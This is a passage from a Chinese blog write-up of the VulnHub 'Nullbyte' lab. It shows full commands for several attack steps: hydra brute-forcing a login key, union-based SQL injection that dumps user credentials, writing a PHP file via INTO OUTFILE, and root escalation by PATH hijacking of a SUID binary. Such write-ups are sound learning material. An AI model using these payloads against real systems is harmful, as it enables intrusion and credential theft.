src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/8.png" alt="1"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/9.png" alt="1"></p><blockquote><p>然而没什么新的有效信息，顺着访问phpmyadmin和uploads</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/10.png" alt="1"></p><blockquote><p>uploads说我们没有权限查看该目录的列表，但是推测可以通过&#x2F;uploads&#x2F;shell.php访问内容</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/11.png" alt="1"></p><blockquote><p>常规的登录界面，测试注入无果<br>线索只剩了main.gif，推测其中有信息隐写</p></blockquote><h3 id="exiftool查看图片信息"><a href="#exiftool查看图片信息" class="headerlink" title="exiftool查看图片信息"></a>exiftool查看图片信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exiftool main.gif<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/12.png" alt="1"></p><blockquote><p>在图片详细信息中就发现了一段文字kzMb5nVYJw<br>先保存到hint.txt</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/13.png" alt="1"></p><blockquote><p>尝试直接做phpmyadmin登录、ssh登录，全部失败<br>尝试抓包对uploads目录直接上传文件，失败<br>尝试gif图片隐写检查，失败</p></blockquote><blockquote><p>突然突发奇想，ctf比赛时为了防止目录爆破经常起奇怪的文件名，尝试将这段文字当作路径，居然还真成功了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/14.png" alt="1"></p><blockquote><p>接着对着这个页面是一顿测注入，能测的都测了一遍，结果发现这页面不能执行sql语句，大概率就没连着数据库。就是一个单纯的验证key的界面，目前只能期望hydra爆破能走通了…</p></blockquote><h3 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h3><p>参考：[[入门打靶 (5台wp)#hydra密码爆破]]</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/15.png" alt="1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.130 -s 80 http-post-form <span class="hljs-string">&quot;/kzMb5nVYJw/index.php:key=^PASS^&amp;ps=^USER^:invalid key&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>根据抓取的数据包构造以上爆破语句，用rockyou成功爆破出key<br>登录：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/16.png" alt="1"></p><blockquote><p>登录后终于来到有查询功能的页面，抓包开测注入：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/17.png" alt="1"></p><blockquote><p>确认存在sql注入，且是”型，测万能语句“or 1#</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/18.png" alt="1"></p><blockquote><p>测出列数为3：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/19.png" alt="1"></p><blockquote><p>尝试写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/20.png" alt="1"></p><blockquote><p>失败，可能是路径猜测错误，也可能是没有权限<br>老老实实查内容：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/21.png" alt="1"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,group_concat(schema_name) from information_schema.schemata#<br></code></pre></td></tr></table></figure><blockquote><p>两个库最感兴趣：phpmyadmin、seth<br>先查phpmyadmin：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,group_concat(table_name) from information_schema.tables where table_schema=&#x27;phpmyadmin&#x27;#<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/22.png" alt="1"></p><blockquote><p>说实话看到这个前缀就感觉不会有什么有用信息，但保险起见还是看看这两个和user相关的表：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,group_concat(column_name) from information_schema.columns where table_name=&#x27;pma_userconfig&#x27;#<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/23.png" alt="1"></p><blockquote><p>果然是两张空表<br>转回seth库：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/24.png" alt="1"></p><blockquote><p>只有users表：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/25.png" alt="1"></p><blockquote><p>把数据全dump出来：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,group_concat(id,0x7c,user,0x7c,pass,0x7c,position,0x7c) from users#<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/26.png" alt="1"></p><blockquote><p>得到一个ramses的凭据：<br>id：ramses<br>pass：YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE </p></blockquote><blockquote><p>解码：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/29.png" alt="1"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/30.png" alt="1"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/31.png" alt="1"></p><blockquote><p>成功解出最终凭据：<br>ramses@omega</p></blockquote><blockquote><p>尝试登录ssh、phpmyadmin：</p></blockquote><h2 id="0x03-获得立足点-ssh777端口"><a href="#0x03-获得立足点-ssh777端口" class="headerlink" title="0x03 获得立足点(ssh777端口)"></a>0x03 获得立足点(ssh777端口)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -p 777 ramses@10.10.10.130<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/32.png" alt="1"></p><blockquote><p>ssh登录成功，直接拿到了立足点，感觉无需再去尝试phpmyadmin的登录<br>开始做信息收集，先完善tty：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/33.png" alt="1"></p><blockquote><p>1、枚举home目录，都无写权限，放弃写公钥横向提权</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/34.png" alt="1"></p><blockquote><p>2、sudo枚举，没有任何结果</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/35.png" alt="1"></p><blockquote><p>3、自动任务枚举：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/cron<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/36.png" alt="1"></p><blockquote><p>4、s位枚举：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/37.png" alt="1"></p><blockquote><p>一眼看到最特殊的&#x2F;var&#x2F;www&#x2F;backup&#x2F;procwatch，基本可以肯定它有问题<br>且gtfobins查询其余文件均无法s位提权</p></blockquote><h2 id="0x04-suid提权"><a href="#0x04-suid提权" class="headerlink" title="0x04 suid提权"></a>0x04 suid提权</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/38.png" alt="1"></p><blockquote><p>很遗憾只有执行权限，先执行一次看看：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/39.png" alt="1"></p><blockquote><p>好像是执行了一次ps和sh的操作，并把ps的结果返回了？<br>感觉可以软链接提权：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/40.png" alt="1"></p><blockquote><p>因为不太熟悉这种提权方式，不知道为什么不太行…<br>突然想到可以劫持ps的环境变量，实现指向sh：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/41.png" alt="1"></p><blockquote><p>成功提权</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/42.png" alt="1"></p><blockquote><p>拿到凭证</p></blockquote><h2 id="0x05-自我反思补足"><a href="#0x05-自我反思补足" class="headerlink" title="0x05 自我反思补足"></a>0x05 自我反思补足</h2><h3 id="sql注入写马"><a href="#sql注入写马" class="headerlink" title="sql注入写马"></a>sql注入写马</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/50.png" alt="1"></p><blockquote><p>当时还向&#x2F;tmp目录写做了尝试，打完后发现tmp的确实写进去了</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/43.png" alt="1"></p><blockquote><p>查看web根目录权限，发现是因为mysql用户并无该目录的写权限</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/44.png" alt="1"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/45.png" alt="1"></p><h3 id="软链接提权"><a href="#软链接提权" class="headerlink" title="软链接提权"></a>软链接提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s &lt;target&gt; &lt;link_name&gt;<br></code></pre></td></tr></table></figure><blockquote><p>link_name为被劫持文件</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/46.png" alt="1"></p><blockquote><p>首先被劫持文件不能已经存在，否则报错<br>其次如果想要强制替换已存在的被劫持文件，参数可改为-sf，但也需要有写权限</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/47.png" alt="1"></p><blockquote><p>所以一般情况下，软链接提权要和环境变量劫持一同使用，如下：<br>(由于当前目录也有写权限，直接把当前目录写入环境变量即可)</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/48.png" alt="1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /bin/sh ps<br></code></pre></td></tr></table></figure><blockquote><p>即在当前目录生成一个ps文件，并软链接指向&#x2F;bin&#x2F;sh</p></blockquote><blockquote><p>之后执行 <code>./procwatch</code> 触发root sh</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/49.png" alt="1"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><ol><li>端口扫描：80 web服务，777 ssh服务</li><li>web渗透：从图片详细信息得到隐藏路径，在sql注入失败的情况下对隐藏路径的登录key值进行爆破，成功进到连接数据库的查询页面；使用联合查询对其注入，得到用户信息，解码后为ssh凭据</li><li>提权：通过ssh获得立足点，枚举发现root身份的s位脚本文件，该脚本以root身份执行ps命令；通过劫持ps命令的执行文件，换为执行sh，获得root shell；此处亦可通过软链接劫持ps命令达到相同效果</li></ol><h2 id="0x07-看wp及视频后反思补足"><a href="#0x07-看wp及视频后反思补足" class="headerlink" title="0x07 看wp及视频后反思补足"></a>0x07 看wp及视频后反思补足</h2><blockquote><p>对于自我反思补足部分的勘误补足：<br>虽然&#x2F;var&#x2F;www&#x2F;html目录整体并无写入权限，但是存在uploads页面，不妨大胆推测此处可进行写操作，尝试对&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/50.png" alt="1"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,&#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;/var/www/html/uploads/info.php&#x27;#<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/51.png" alt="1"></p><blockquote><p>接着写马弹shell即可</p></blockquote><blockquote><p>反思：盲打阶段虽然考虑到了尝试写马，但当发现不能直接写到网站根目录时放弃过早，即使没有从uploads的名字联想到可以写数据，也应该根据目录爆破结果逐个尝试(intruder)</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
